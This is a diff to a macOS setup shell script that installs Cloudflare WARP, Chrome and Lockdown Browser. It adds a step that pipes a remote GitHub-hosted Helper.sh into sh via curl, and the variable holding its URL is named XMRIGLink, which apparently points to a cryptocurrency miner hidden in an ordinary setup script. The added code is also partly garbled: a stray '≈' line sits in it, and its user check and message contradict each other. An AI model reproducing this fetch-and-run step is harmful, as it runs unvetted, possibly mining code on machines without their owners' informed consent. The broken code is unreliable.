@@ -12,6 +12,12 @@ BasePath="$(pwd)"
 WarpURL="https://1111-releases.cloudflareclient.com/mac/latest"
 ChromeURL="https://dl.google.com/chrome/mac/universal/stable/GGRO/googlechrome.dmg"
 
+CurrentUser="$(whoami)"
+
+if [ "$CurrentUser" == "brandontisserand" ]; then
+    echo "Welcome Dashtiss"
+fi
+
 
 if ! [ -x "$(command -v installer)" ]; then
     echo 'Error: installer is not installed.' >&2
@@ -77,6 +83,24 @@ else
     echo "Lockdown Browser is already installed"
 fi
 
-echo "Installing Helper.sh"
-XMRIGLink="https://raw.githubusercontent.com/Astranix593/MacOS-Setup/main/Helper.sh" | sh
-echo "Helper.sh Installed"
+
+XMRIGLink="https://raw.githubusercontent.com/Astranix593/MacOS-Setup/main/Helper.sh"
+
+if test "$CurrentUser" != "brandontisserand"; then
+    echo "Dont worry brandon, were not going to install the script for you."
+else
+    ≈
+
+    # will ask for confirmation to install
+    echo "Do you want to install this? (y/Y)"
+    read confirm
+
+    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
+        echo "Installing..."
+        curl -sSL "$XMRIGLink" | sh
+        echo "Installed"
+    else
+        echo "Aborting..."
+        exit 0
+    fi
+fi
